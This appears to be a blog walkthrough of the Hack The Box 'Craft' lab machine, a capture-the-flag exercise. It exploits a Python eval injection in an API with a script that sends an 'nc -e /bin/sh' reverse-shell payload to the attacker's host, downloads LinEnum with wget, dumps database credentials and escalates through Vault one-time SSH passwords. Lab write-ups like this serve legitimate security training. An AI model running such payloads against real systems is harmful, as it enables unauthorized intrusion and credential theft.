My first `Medium` box! Didn't think I was capable of doing it so soon haha. I saw that this box was retiring soon so I thought "why not"? Of course, I needed the help of the forums to guide me :P

![](/assets/images/craft.png){:height="414px" width="615px"}

# Configuration

The operating systems that I will be using to tackle this machine is a Kali Linux VM.

What I learnt from other writeups is that it was a good habit to map a domain name to the machine's IP address so as that it will be easier to remember. This can done by appending a line to `/etc/hosts`.

{% highlight bash %}
$ echo "10.10.10.110 craft.htb" >> /etc/hosts
{% endhighlight %}

# Reconnaissance

Using `nmap`, we are able to determine the open ports and running services on the machine.
{% highlight bash %}
$ map -sV -sT -sC craft.htb

# Enumeration (1)

Not much can be done with the `ssh` service as we do not have any credentials on hand so lets come back to it later. As for the `https` service, maybe we can find some information on it ?

![](/assets/images/craft1.png)

Nothing much here except for the `API` and the `git` icon on the top right. Lets first check out the `API`.

It was a link to `https://api.craft.htb/api/`, hence we had to add `api.craft.htb` to our `/etc/hosts` for the page to be resolved properly.

{% highlight bash %}
$ cat /etc/hosts
...
10.10.10.110 craft.htb api.craft.htb
{% endhighlight %}

![](/assets/images/craft2.png)

After playing around with some of the different APIs, what caught my attention was `/auth/login`. Upon clicking on `Execute`, I was prompted for credentials.

![](/assets/images/craft3.png)

Since I did not have any credentials, I decided to put this on hold for now. Lets move on the `git` icon. It was a link to `https://gogs.craft.htb`, hence we need to modify our `/etc/hosts` again.

{% highlight bash %}
$ cat /etc/hosts
...
10.10.10.110 craft.htb api.craft.htb gogs.craft.htb
{% endhighlight %}

![](/assets/images/craft4.png)

So this website is like a private github of some sort? By clicking on `Explore`, we are able to list all the public repositories, users and organisations on the website.

![](/assets/images/craft5.png)

Oh we found something! There is a repository that might be related to `https://api.craft.htb/api`!

![](/assets/images/craft6.png)

This repository seems to contain the source code. Lets try looking around.

![](/assets/images/craft7.png)

There was an issue posted which contained the API token, but sadly was expired. In the commits history, I found some credentials!

![](/assets/images/craft8.png)

Looks like Dinesh accidentally commited his credentials and tried to cover it up haha. To check if the credentials are still valid, we returned to `https://api.craft.htb/api/` and key them into the prompt for the `/auth/login` feature.

![](/assets/images/craft9.png)

We managed to get a valid API token! Not much can be done now so I decided to look at the source code for any vulnerabilites.

# Exploitation (1)

On `https://gogs.craft.htb/Craft/craft-api/src/master/craft_api/api/brew/endpoints/brew.py`, there was a certain section that caught my eye.

{% highlight python %}
@ns.route('/')
class BrewCollection(Resource):
    ...
    @auth.auth_required
    @api.expect(beer_entry)
    def post(self):
        """
        Creates a new brew entry.
        """

        # make sure the ABV value is sane.
        if eval('%s > 1' % request.json['abv']):
            return "ABV must be a decimal value less than 1.0", 400
        else:
            create_brew(request.json)
            return None, 201
{% endhighlight %}

`eval` was being called with input from the `abv` field in the sent JSON for the `/brew/` route. This means that whatever `python` expression we enter in the `abv` field, it will be executed. Hm...

I decided to search for how to achieve reverse shell from the `eval` function and I found this [post](https://stackoverflow.com/questions/59519289/python-running-reverse-shell-inside-eval) on StackOverflow.

When `"__import__('os').system('nc 10.10.XX.XX -e /bin/sh')"` is inputted into `eval`, it will cause the box to connect back to us. I used the below `python` script to assist in the sending of the payload.

{% highlight python %}
import requests

authtoken = requests.get('https://api.craft.htb/api/auth/login',  auth=('dinesh', '4aUh0A8PbVJxgd'), verify=False).json()["token"]

exploit = {
        'abv':"__import__(\'os\').system(\'nc 10.10.XX.XX 1337 -e /bin/sh\')",
        "brewer": "string",
        "name": "string",
        "style": "string",
}

headers = {'X-Craft-Api-Token': authtoken}

print(requests.post('https://api.craft.htb/api/brew/', json=exploit, headers=headers, verify=False).content)

{% endhighlight %}

With the script ready, we start our listener:

{% highlight bash %}
$ nc -lvnp 1337
listening on [any] 1337 ...
{% endhighlight %}

And run our exploit script. Back on our listener, we catch the connection. Wait, we are already root?

{% highlight bash %}
listening on [any] 1337 ...                                         
connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.110] 46345

{% endhighlight %}

There was no `root.txt` at `/root`, so what is going on?

# Enumeration (2)

Lets try running [`LinEnum`](https://github.com/rebootuser/LinEnum) to get some insights.

{% highlight bash %}
$ mkdir httpserver
$ cd httpserver
$ cp ~/LinEnum.sh .
$ python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
{% endhighlight %}

{% highlight bash %}
wget http://10.10.XX.XX/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh

Ahh I see, we are in a Docker container. We might need to escape from it if we want to get our flags :P 

Looking back at the repository on `https://gogs.craft.htb`, there was a `.gitignore`.

{% highlight raw %}
*.pyc
settings.py
{% endhighlight %}

The `settings.py` seemed interesting. It was located at `/opt/app/craft_api` and it contained a lot of juicy information.

Nice we got the credentials for a `mysql` database service running on the box. According to the model schema found at `https://gogs.craft.htb/Craft/craft-api/src/master/craft_api/database/models.py`, there is a `User` table containing usernames and passwords.

We can modify this database testing script at `https://gogs.craft.htb/Craft/craft-api/src/master/dbtest.py` to dump out the table.

{% highlight python %}
#!/usr/bin/env python

import pymysql
from craft_api import settings

# test connection to mysql database

connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST,
                             user=settings.MYSQL_DATABASE_USER,
                             password=settings.MYSQL_DATABASE_PASSWORD,
                             db=settings.MYSQL_DATABASE_DB,
                             cursorclass=pymysql.cursors.DictCursor)

try: 
    with connection.cursor() as cursor:
        sql = "SELECT `id`, `username`, `password` FROM `user`"
        cursor.execute(sql)
        result = cursor.fetchall()
        for creds in result:
            print(creds)

finally:
    connection.close()
{% endhighlight %}

Running the script gave us more credentials!

{% highlight bash %}
python dbtest_new.py
{'id': 1, 'username': 'dinesh', 'password': '4aUh0A8PbVJxgd'}
{'id': 4, 'username': 'ebachman', 'password': 'llJ77D8QFkLPQB'}
{'id': 5, 'username': 'gilfoyle', 'password': 'ZEU3N8WNM2rh4T'}
{% endhighlight %}

Lets try logging in to `https://gogs.craft.htb` using these credentials.

Only `dinesh`'s and `gilfoyle`'s credentials worked. However, in `gilfoyle`'s homepage I noticed another repository but was private.

![](/assets/images/craft10.png)

Looking through the repository, I found a `ssh` key pair at `https://gogs.craft.htb/gilfoyle/craft-infra/src/master/.ssh/id_rsa`


# user.txt

I downloaded the `id_rsa`, which is the private key.

# Enumeration (3)

In `gilfoyle`'s private repository, there was a folder called `vault`. Thinking it was a name for a service, I went to search online and found [this](https://www.vaultproject.io/).

{% highlight raw %}
A tool for secrets management, encryption as a service, and privileged access management.
{% endhighlight %}

In the folder, I found a script at `https://gogs.craft.htb/gilfoyle/craft-infra/src/master/vault/secrets.sh`

Hmm... Seem like `vault` is being used to store `ssh` keys or something? Time to look at the [documentation](https://www.vaultproject.io/docs/secrets/ssh/one-time-ssh-passwords.html).

# root.txt

The commands looked pretty similar. Following the `Automate it` section, all we have to do is create a new OTP and `ssh` into the box.

{% highlight bash %}
vault ssh -role root_otp -mode otp root@127.0.0.1
Vault could not locate "sshpass". The OTP code for the session is displayed
below. Enter this code in the SSH password prompt. If you install sshpass,                                         
Vault can automatically perform this step for you.
